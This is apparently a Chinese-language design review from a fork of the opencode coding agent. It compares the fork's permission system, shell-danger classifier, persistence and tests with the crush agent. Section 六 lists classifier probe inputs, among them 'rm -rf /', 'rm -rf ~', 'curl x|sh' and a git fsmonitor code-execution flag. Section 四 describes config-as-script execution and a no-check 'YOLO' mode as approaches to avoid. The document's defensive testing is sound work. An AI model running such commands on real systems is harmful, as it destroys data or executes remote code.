5. **审批落盘粒度 / 回执 / 服务端记录可信度** —— **L31 / L37 / dsh §3.3** 已立项。crush 的 `resolve()` 信服务端存储的请求记录而非客户端回显（多客户端伪造），以及「内存 only 的 always-allow」（`sessionPermissions *csync.Map` 不写盘）——前者并入 L31，后者是反面证据（见 §四.3）。
6. **桌面/后台 CLI 版本漂移** —— **OH-1** 已立项（本仓已知痛点）。crush 补一条**可并入 OH-1 的机械保证**：`version.deriveBuildID`（exe mtime）参与「服务端与客户端构建不一致 → `restartIfStale`」，即**版本相同时也能发现二进制不同**——正好命中我们「同版本桌面构建复用旧暂存 CLI」那个付过学费的坑。不另立项。
7. **供应链与 CI 闸门 / 签名分发** —— **codex P7→M2**、**OH-7**、**L39**。crush 的 cosign `sign-blob` + SBOM + grype `severity-cutoff: critical` + tag 前双 workflow 绿灯，归 M2/L39；本仓已有 `check:generated` 与 SHA 固定的 actions **[实测]**。
8. **LLM 调用的 cassette 回放测试** —— **L16 / OH-9**（录制回放与对抗 fixture）已立项。crush 侧事实：`charm.land/x/vcr` + `task test:record`（删 `internal/agent/testdata` 重录）、`internal/agent/testdata` 存真实对话；另有 **363** 个 `.golden`（`charmbracelet/x/exp/golden`，`go test ./... -update` 重生成，CI 靠普通 test 比对漂移）。TUI 无 DOM 的测法是「纯函数把消息渲成 ANSI 串再逐字节比 golden」。→ 补事实给 L16：goldens 的**重生成命令**与**漂移检测**是同一套 test，不需要额外闸门。
9. **技能索引 / 来源标注 / 冲突披露** —— **codewhale §3.2-3.3→L32**、reasonix 撤下行、本仓提交 `08aef689be`（指令池预算 + 技能冲突披露）已覆盖。
10. **工具表面 token 预算** —— **L18 / L30** 已立项。CR-4 因此刻意**不新开工具名**，只加动作。
11. **OpenHands 的「反向工具」/「桌面自带运行时」/「版本守卫」** —— 均归 OH-4/OH-2/OH-1，本轮无新增事实。

---

## 四、明确不学（含反面证据）

1. **`crushrc`：把配置当 shell 脚本执行。** **[对方实测 + 转述]** `internal/shellconfig/load.go LoadShellConfig` 用内嵌 POSIX 解释器跑 `crushrc`（`loadTimeout = 30s`），内建 `provider/model/mcp/lsp/permissions/hook/option` 直接改 `ConfigBuilder`，并支持 `$(password-manager show …)` 取密。代价：**项目目录里的一个脚本 = clone 即代码执行**，且 crush 文档自己称 crushrc "a trusted file"。本仓 `config/discovery.ts` 的 `names = ["opencode.json", "opencode.jsonc"]` 保持声明式，能力扩展走显式 plugin——**不学**。这是本轮最贵的一个反面证据，值得在 `doc/permissions.md` 的来源分档（reasonix 第 2 项）落地时引用。
2. **项目配置可静默授予工具权限。** crush 的求值顺序把配置 `allowedTools` 放在提问**之前**，且无项目 trust 门（`internal/app/app.go` 把合并配置直接喂进 `NewPermissionService`）。本仓 `doc/permissions.md` 已把 escalation 写成 outranks 项目 config —— 这是我们独有、且 `优势对比清单.md` §3.1 判定要守死的性质。**不学，并继续守。**
3. **持久审批只放内存。** `GrantPersistent` 写 `csync.Map`，重启归零。我们已有 `PermissionSaved` + 投影表（L31 的方向），不退回。
4. **「parts 存单个 JSON blob + 连接池钉死 1」的持久化。** **[转述]** crush `session/messages.parts` 是 `marshalParts` 的 JSON 文本，tool 终态只是 blob 里的 `Finished bool`；`db/connect.go` 因「多连接交错写入曾导致 WAL/header desync → `SQLITE_NOTADB(26)`」而 `SetMaxOpenConns(1)`，崩溃恢复靠读时修。我们是有序事件 + 事务内投影 + 写前执行 claim，**不学这个妥协**。但把它的**失败模式**收下：任何「多写入者 + WAL checkpoint」组合都值得一次同形压测——我们 `session.tool.*` 与 compaction 并发写目前是否也受连接数约束，本轮未测（见 §七.4）。
5. **只有内置 agent。** crush 的 `Config.Agents` 是 `json:"-"` 且无加载器，只有 `coder / task / plan` 三个内置。我们的 agent 配置面更广（收紧由 reasonix 第 2 项的来源门负责）。
6. **把「什么都不拦」放进盲按循环。** crush 的 Shift+Tab 环是 `code → plan → YOLO → sysadmin → code`（`toggleInputMode`，注释强调无状态：下一档恒等于徽标提示的那一档），四次按键里含一个连 exec 时黑名单都不查的档位。**CR-2 借「两轴」这一刀，不借这个键位**；我们的档位选择器也不该新增一条会循环到「无检查」档的按键。
7. **静默的 LSP 失败**（`slog.Error` + 删 client + "continuing anyway"）。CR-3 明确要求失败可见。
8. **`question` 只有一个 pending、无关联 ID。** **[转述]** `internal/question` 全进程只允许一个待答问题，靠 `Notification` 让别的客户端关掉重复表单。我们 `tool/plugin/question.ts` 已在工具面上，不需要这个退化形式。（可吸收的小做法只有一条：**校验错误文本写给模型看**，例如 "Use `choices`, not `options`"——这与本仓「错误文本是给模型的可执行纠正」取向一致，不单独立项。）
9. **后台服务 60s idle 自杀 + 10s detach grace。** 那是为「单客户端 CLI」设计的。我们的后台服务是 TUI 与 desktop 共享的长生命周期进程，且 `SessionExecution` 的写前 claim 语义要求中断/存活可区分；照搬会让桌面端关窗即打断在跑的 drain。
10. **`internal/shell` 内嵌解释器**（`mvdan.cc/sh`，Windows 上也跑「POSIX 模拟」，Go 版 coreutils）。它换来的正是 CR-1 想借的 flag 级策略能力，但**换栈不是本轮范围**；我们在 tree-sitter `bash`/`powershell` 语法上已有 `shell/parse.ts` + `shell/scan.ts`，补一张 flag 表比重写解释器便宜两个数量级。

---

## 五、对照时照出的本仓事实（不是借鉴项）

1. **`lsp` 是一条活配置 + 死实现。** schema、normalize、GUI 分区、e2e 断言都在，运行时不在，`ConfigLSP.Server.initialization` 字段无任何消费者，`doc/` 也没有对应节。按 `agents.md`「代码与文档冲突时以代码为准，发现者修文档」与 doc-sync 即完成定义：**要么在 CR-3 M-a 之前先写一节「配置可写、当前无效」，要么就做 M-a**；保持现状就是继续对用户撒谎。
2. **arity 通配的 save 形状不是 git 专属。** 探针显示 `docker rm *`、`kubectl delete *`、`gh pr merge *` 同形。对纯只读命令无害，对可破坏动词就是把 **flag 维度整体记住**。→ 建议把第六节那 9 条探针固化成 `packages/core` 的一个测试，而不是留在本文里当口头结论。
3. **`Permission.evaluate` 的 escalation 与「full 是唯一 opt-out」这条不变量，是靠 ruleset 文本识别的**（`permission-mode.ts` 的 `same()` 用 `JSON.stringify` 逐条比较）。CR-2 新增档位时必须给它一个**可区分的标记**，否则「文本看起来像 full」会导致新档静默继承 full 的豁免——这是本轮读码发现的结构性约束，值得单独记进 `doc/permissions.md` 的 Decisions。
4. **待核清单（本文所有 [转述] 与 [UNVERIFIED] 的收口位置）**：`GrantKey` 的真实形状；`fantasy` 里是否有工具并发上限与邻接修复；crush LSP 的 `skipAutoStartCommands` 具体 28 项内容；我们内联工具输出的 ANSI 走向；`script/release.ts` 是否已有 CI 前置；我们 SQLite 的连接数与并发写形态。
5. **`优势对比清单.md` 的三条「无通用重复断路器」已经过时（本轮实测撞出）。** 台账基线是 `loop-reliability-docs @ 81738639df`（`2.2.0-fork.10`），而 `packages/core/src/session/runner/loop.ts` 是在其后的 `08aef689be`（"stop runaway turns"）落地的。今天 `grep -rn 'repetition\|loopDetect\|isLoop\|stuck' packages/core/src --include='*.ts'` 命中 **5 条**（`runner/loop.ts` 的 `repetition()`、`declinedRun()`、`LOOP_GUARD*` 文案与注释），台账里 §3.2 的「我们的缺口」、§4 缺口表的「**无通用重复/空转断路器** —— 零命中」、§六 复核命令注释的「空 = 无通用断路器」三处都描述的是**已被实现掉的洞**。按 `agents.md`「代码与文档不一致时以代码为准，发现者负责在同一改动里修文档」，这三处应补一行更正，并把 §2 的一句话结论从「我们没有在单次执行不出事这条轴上领先」改成「循环检测已补齐四类判据，但仍**没有** OS 沙箱与决策代数」——否则下一轮会把它当作待立项的缺口重复立项（本轮就差点这样写，见 §三.2）。**这不是借鉴项，是本仓自己的 doc-sync 债务。**
6. **邻接不变量没有局部守卫，靠两道外部兜底（本轮读码照出的结构，不是已证缺陷）。** `runner/to-llm-message.ts` 的 `toolResult()` 只对 `completed` 与 `error` 两种状态有分支，调用处以 `return result ? [call, result] : [call]` 兜底，`results` 那条管子也带 `.filter((message) => message !== undefined)` —— 也就是**一旦历史里存在非终态（`streaming` / `running`）的工具调用，请求里就会出现一个没有 result 的 tool call**，正是 crush 注释里 "strict-adjacency providers (e.g. Kimi, DeepSeek) reject the request otherwise, **permanently locking the session**" 的那个形状。我们靠三处别处的机制保证它不发生：`runner/llm.ts` 的 `settleStaleToolCalls`（drain 起点，把 `streaming`/`running` 发成 `SessionEvent.Tool.Failed` 且 `type: "aborted"`，子代理调用还带 `childID` 提示）、`runner/step.ts` 的 `publisher.failUnsettledTools(...)` + `failIncompleteTools()`、`session/history.ts` 的 `preview` 只取 settled 前缀。**但 `settleStaleToolCalls` 只在 drain 起点跑一次**，同一次 drain 内部若出现非终态调用（parser 半途、hosted 工具），唯一防线是 step 末的 `failUnsettledTools`。本轮**没有**构造出这个状态 **[UNVERIFIED]**，值得的不是修复而是补一条测试：直接给 `to-llm-message` 喂一条 `running` 态的工具，断言它要么被拒绝、要么合成一条 error result —— 把「不会发生」从推理变成断言。这与 CR-1 无关，也不属于任何已立项轮次。

---

## 六、复核命令

```bash
# crush 规模（§标题行的来源）
ls /d/code/github/crush/internal | wc -l
find /d/code/github/crush/internal -name '*.go' | wc -l
find /d/code/github/crush/internal /d/code/github/crush/main.go -name '*.go' ! -name '*_test.go' | xargs wc -l | tail -1
find /d/code/github/crush/internal -name '*_test.go' | xargs wc -l | tail -1
find /d/code/github/crush -name '*.golden' | wc -l          # 363

# CR-1 的 save/classify 探针（放 packages/core/ 跑，跑完删除）
#   import { ShellDanger } from "./src/shell/danger.js"
#   import { ShellParse } from "./src/shell/parse.js"
#   对每条命令打印 ShellDanger.classify(cmd) / scan(...,{portable:true}).commands[].save
#   命令集：docker rm mycontainer / docker rm --force x / kubectl delete pod x /
#           kubectl delete pod x --grace-period=0 / git push origin main /
#           git push --force origin main / git -c core.fsmonitor=/tmp/evil status /
#           gh pr create / gh pr merge --auto  ＋ 对照组 rm -rf / , rm -rf ~ , curl x|sh
cd /d/code/opencode/packages/core && bun tmp-save-probe.ts && rm tmp-save-probe.ts

# CR-1 端到端（本清单尚未跑，见第七节第 1 条）
bun run dev:live            # 批准 git push origin main 的「总是允许」，再跑 --force-with-lease

# CR-2 现状
grep -n 'PermissionMode\|RISKY_ACTIONS\|ruleset' packages/app/src/session/composer/permission-mode.ts
sed -n '/## The three composer modes/,/^## /p' doc/permissions.md | head -40

# CR-3 死配置与 TODO 面
grep -rn 'ConfigLSP' packages/core/src --include='*.ts'
grep -rn 'after LSP runtime exists' packages/core/src
grep -rn 'LSP' packages/app/e2e/regression/session-summary.spec.ts | head

# CR-5 / CR-6 现状
grep -rn 'stripAnsi\|stripAnsiSequences' packages/tui/src --include='*.tsx' --include='*.ts' | head
grep -rn -iE 'ansi16|color.?profile|truecolor' packages/tui/src | head    # 零命中
grep -rn 'MarkdownRenderable\|getTreeSitterClient' packages/tui/src/mini | head

# 结算与邻接（§一.3）
grep -rn 'failUnsettledTools\|settleStaleToolCalls' packages/core/src/session | grep -v test | head
# 熔断现状（§三.2 与 §五.5）：现在命中 5 条，不再是零
grep -rn 'repetition\|loopDetect\|isLoop\|stuck' packages/core/src --include='*.ts' | head
grep -n 'WINDOW\|MAX_PERIOD\|REPEAT_LIMIT' packages/core/src/session/runner/loop.ts

bun script/doc-refs.ts      # 本清单不进 doc/，但任何落地点都要过它
```

---

## 七、会推翻本清单的事

1. **CR-1 端到端未证。** 我只测到了 `classify` 与 `save` 两层。若真机跑一次「批准 `git push origin main` → 跑 `git push --force-with-lease`」后发现仍被拦住（例如 `parsed.opaque` 路径或别处还有一道 escalation），**CR-1 降级为「只修 `git -c *` 的代码执行面」**，`--force` 那一半并入 §四 的已判项。
2. **`fantasy` 读不到。** 若其工具并发上限、邻接处理或 finish 判定与我们的假设不同，§一.3 的两条「我们更强」（结算、邻接）需要重述，甚至可能新增一条本仓缺口。本清单**没有**依据 crush 的循环内核做任何判断，这一点在 fantasy 可读之后要重新确认。
3. **LSP 若已在别处存在。** 我 grep 的范围是 `packages/*/src`（排除 node_modules、i18n、dist）与已删除的 `packages/opencode` 历史树之外。若上游把运行时放在 `services/` 或某个未扫目录，CR-3 撤下，只剩 §五.1 的死配置事实。
4. **ANSI 若已经重映射。** 若 OpenTUI 内部已做 16 色 → 主题的处理（本轮未测），CR-5 撤下；只有「透传不可读」或「整体抹平丢语义」两种实测结果才立项。
5. **渲染若已够快。** 若度量显示每帧成本与列表长度基本无关（tree-sitter 增量 + retained scrollback 快照已经吃掉了重算），CR-6 立即撤下，不留「顺手加个缓存」的尾巴。
6. **CR-1 若把体验做坏。** 「每次 `git -c` 都问」若成为日常负担，则本项退化为「仅对含执行/写文件语义的 flag 不产出通配 save」，其余保持现状。
7. **OH-1 / M2 吸收了 §三.6、§三.7。** 若那两轮把 BuildID/mtime 一类的**同版本可判别**信号纳入同一闸门，本文的两条补事实直接被吸收，不要重复实现。
8. **CR-2 与本仓不变量冲突不可解。** 若新档位无法在不引入「文本猜测」的前提下让 escalation 保持生效（见 §五.3），则**宁可不做这一档**，也不要把 full 的豁免扩大到「看起来像 auto」的 ruleset。
